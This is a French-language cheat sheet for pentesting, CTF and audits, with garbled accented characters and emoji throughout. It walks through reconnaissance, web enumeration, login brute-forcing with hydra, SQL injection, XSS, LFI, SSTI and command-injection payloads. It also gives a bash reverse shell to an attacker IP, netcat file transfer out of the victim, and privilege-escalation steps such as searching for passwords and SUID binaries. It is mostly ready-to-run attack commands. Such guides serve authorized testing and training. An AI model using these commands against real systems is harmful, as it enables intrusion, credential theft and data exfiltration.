#########################################################
#         üîê GUIDE G√âN√âRAL PENTEST / CTF / AUDIT        #
#########################################################

PHASE 1 - PR√âPARATION & RECONNAISSANCE
---------------------------------------

üéØ Objectif : identifier l‚Äôenvironnement, d√©couvrir les cibles actives et collecter des infos utiles sans attaquer.

1. Identifier son IP locale :
‚û§ Commande :
    ifconfig     # ou : ip a

2. Scanner le r√©seau local pour trouver les autres machines actives :
‚û§ Commande :
    nmap -sn <IP>.1-254
    netdiscover -r <IP>/24

3. Scanner les ports d'une cible :
‚û§ Commande :
    nmap -A -T4 -p- <IP>
    ‚ÑπÔ∏è‚Äã Identifie tous les ports TCP, les versions des services, le syst√®me d'exploitation, etc.

4. Identifier les services :
‚û§ Commande :
    nmap -sV <IP>

5. Si un nom de domaine appara√Æt, tu veux le r√©soudre :
‚û§ Commande :
    sudo nano /etc/hosts
    # Exemple : 192.168.1.12 web.local
    ‚ÑπÔ∏è Permet d'utiliser des noms comme `http://web.local` au lieu d'IP brutes.

6. Collecter des informations passives suppl√©mentaires :
‚û§ Commande :
    whois <domaine>
    dig <domaine>
    nslookup <domaine>
    ‚ÑπÔ∏è Pour conna√Ætre les IP, serveurs DNS, MX, registrar, etc.

7. Connaitre les technologies Web utilis√©es :
‚û§ Commande :
    whatweb http://<IP>
    wappalyzer (navigateur)
    ‚ÑπÔ∏è Pour savoir si la cible utilise WordPress, Apache, PHP, etc.

PHASE 2 - ENUM√âRATION & ANALYSE WEB
------------------------------------

üéØ Objectif : identifier des chemins cach√©s, failles de config, vuln√©rabilit√©s web, utilisateurs ou services web actifs.

8. Port 80 ou 443 ouvert ? Enum√©ration des r√©pertoires et fichiers cach√©s :
‚û§ Commande :
    gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
    dirb http://<IP>/
    dirsearch -u http://<IP>/ -e php,html,txt

9. Analyse manuelle :
‚û§ Checklist :
    - Inspecter le code source HTML
    - robots.txt, .git, .env, .bak, config.php, etc.
    - Fichiers d'erreur ou config
    - Injection dans les URL et param√®tres

10. Scanner vuln√©rabilit√©s :
‚û§ Commande :
    nikto -h <IP> -p 80
    ‚ÑπÔ∏è Teste la pr√©sence de fichiers sensibles, versions vuln√©rables, headers faibles, etc.

11. Si c'est un Wordpress :
‚û§ Commande :
    wpscan --url http://<IP>/ --enumerate u
    ‚ÑπÔ∏è Pour r√©cup√©rer les utilisateurs, plugins, th√®mes et vuln√©rabilit√©s WordPress.

12. Bruteforce web (formulaire login) :
    hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
    ‚ÑπÔ∏è Teste les combinaisons utilisateur/mot de passe en masse via brute-force.

13. Intercepter et manipuler les requ√™tes Web en profondeur :
    ‚û§ Outil : BurpSuite (proxy)
    ‚û§ Ce que tu peux faire :
        - Intercepter une requ√™te POST ou GET
        - Modifier les param√®tres en temps r√©el
        - Tester les injections SQL, XSS ou LFI
        - Rejouer une authentification
        - Exporter la requ√™te en curl pour SQLMap
        - R√©cup√©rer headers : Cookie, Referer, Origin...

PHASE 3 - TESTS D‚ÄôINJECTION / VULN√âRABILIT√âS
--------------------------------------------

üéØ Objectif : tester la r√©sistance de l‚Äôapplication aux injections et vuln√©rabilit√©s connues.

14. Si un champ interagit avec une base de donn√©es (ex: ?id= ou formulaire) :
‚û§ Payloads classiques (Faille SQL) :
    ' OR 1=1 --
    admin' --
    ‚ÑπÔ∏è Pour d√©clencher une erreur SQL ou bypass un formulaire de login.

15. SQLMap (Faille SQL automatis√©) :
‚û§ Commandes :
    SQLMap simple :
    sqlmap -u "http://<IP>/page.php?id=1" --batch

    SQLMap avec cookie :
    sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=123abc;" --dbs

    SQLMap avec requ√™te POST :
    sqlmap -u "http://<IP>/login.php" --data="username=admin&password=test" --cookie="PHPSESSID=..." --batch --dump
    ‚ÑπÔ∏è Pour identifier automatiquement les vuln√©rabilit√©s, r√©cup√©rer les bases, tables et donn√©es.

16. XSS :
    <script>alert(1)</script>

17. Si la cible inclut des fichiers (ex: ?page=home) :
‚û§ Test LFI / RFI :
    ../../../../etc/passwd
    data://text/plain;base64,...
    ‚ÑπÔ∏è Pour lire des fichiers locaux (LFI) ou ex√©cuter du code distant (RFI).

18. L‚Äôapplication semble utiliser un moteur de template ? :
‚û§ SSTI :
    {{7*7}} ou {{request}}
    ‚ÑπÔ∏è Pour tester si des variables sont interpr√©t√©es et exploit√©es c√¥t√© serveur.

19. Si un champ est susceptible d‚Äô√™tre inject√© dans une commande syst√®me :
‚û§ Commandes :
    ; whoami
    & id
    `uname -a`
    ‚ÑπÔ∏è Pour ex√©cuter arbitrairement des commandes sur le syst√®me.

PHASE 4 - ACC√àS / SHELL / √âVASION
----------------------------------

üéØ Objectif : obtenir un acc√®s interactif sur la machine cible et sortir d‚Äôun environnement restreint.

20. Tu peux ex√©cuter une commande distante ? :
‚û§ Reverse shell

Attaquant :
    nc -lvnp 4444

Victime :
    bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
    echo 'commande_reverse_shell' | base64 -d | bash

    ‚ÑπÔ∏è Pour ouvrir une connexion invers√©e et obtenir un shell sur Kali.

21. SSH (si identifiants trouv√©s ou bruteforce r√©ussi) :

Connexion :
    ssh utilisateur@<IP>

Exemple bruteforce SSH (Hydra) :
    hydra -l user -P rockyou.txt ssh://<IP>

Connexion via cl√© priv√©e :
    ssh -i id_rsa user@<IP>
    chmod 600 id_rsa

22. Serveur de transfert (Kali) pour envoyer un fichier √† la cible :
    python3 -m http.server 8000
    ‚ÑπÔ∏è Permet d‚Äôh√©berger temporairement des scripts comme linpeas, shells, etc.

23. Transfert de fichier via Netcat (la cible ne peut pas t√©l√©charger en HTTP) :
    # C√¥t√© Kali (r√©cepteur)
    nc -nlvp 7777 > fichier.txt
    # C√¥t√© victime
    nc <IP_KALI> 7777 < fichier.txt

PHASE 5 - POST-EXPLOITATION / PRIVESC
--------------------------------------

üéØ Objectif : augmenter les privil√®ges (user ‚Üí root), persister ou pivoter.

24. V√©rifier les fichiers executable en SUID :
    find / -perm -4000 -type f 2>/dev/null
    ‚ÑπÔ∏è Pour rep√©rer des binaires ex√©cutables avec les droits root.

25. Rechercher fichiers sensibles :
‚û§ Commandes :
    find / -name "*pass*" 2>/dev/null
    cat ~/.bash_history
    grep -i pass /etc/* -R 2>/dev/null
    ‚ÑπÔ∏è Pour rep√©rer des fichiers de config, historiques ou secrets.

26. Conna√Ætre l‚Äô√©tat de la machine :
    ps auxf
    systemctl --type=service
    netstat -tulnp
    ss -tuln
    ‚ÑπÔ∏è Pour voir les services en cours, connexions r√©seau et processus.

27. Les t√¢ches planifi√©es sont parfois exploitables (Cronjobs) :
‚û§ Commandes :
    crontab -l
    cat /etc/crontab
    ls -la /etc/cron*
    ‚ÑπÔ∏è Pour rep√©rer des scripts ex√©cut√©s en root automatiquement.

28. Sudo / droits root :
    sudo -l
    sudo su
    ‚ÑπÔ∏è Pour savoir si certaines commandes peuvent √™tre ex√©cut√©es sans mot de passe ‚Üí GTFOBins

29. Si un binaire personnalis√© est pr√©sent :
‚û§ Commandes :
    ltrace ./binaire
    strace ./binaire
    ‚ÑπÔ∏è Pour observer les appels syst√®me, cha√Ænes manipul√©es, fichiers ouverts.

30. Automatiser la recherche de failles :
‚û§ Outils :
    linpeas.sh
    lse.sh
    pspy
    ‚ÑπÔ∏è Scanners de privil√®ges pour rep√©rer des failles d‚Äô√©l√©vation connues.

PHASE 6 - OUTILS DE BASE √Ä CONNA√éTRE
--------------------------------------

üõ†Ô∏è Outils principaux :
- `nmap` ‚Üí scan des ports, versions, OS
- `netdiscover` ‚Üí d√©couverte r√©seau local
- `gobuster`, `dirb`, `dirsearch` ‚Üí bruteforce de r√©pertoires
- `sqlmap` ‚Üí injections SQL automatis√©es
- `nikto` ‚Üí vuln√©rabilit√©s Web simples
- `wpscan` ‚Üí WordPress vuln√©rabilit√©s & users
- `hydra` ‚Üí bruteforce login (SSH, HTTP, FTP‚Ä¶)
- `whatweb`, `wappalyzer` ‚Üí fingerprint techno web
- `BurpSuite` ‚Üí manipulation HTTP, interception
- `metasploit` ‚Üí exploitation assist√©e
- `john`, `hashcat` ‚Üí crack de mots de passe
- `smbclient`, `enum4linux` ‚Üí √©num√©ration SMB (ports 139/445)
- `python3 -m http.server` ‚Üí serveur de transfert
- `nc` (netcat) ‚Üí transfert ou reverse shell
- `ltrace`, `strace` ‚Üí analyse de binaires
- `linpeas`, `lse`, `pspy` ‚Üí √©l√©vation automatique

PHASE 7 - NOTES PERSO / AJOUTS
-------------------------------


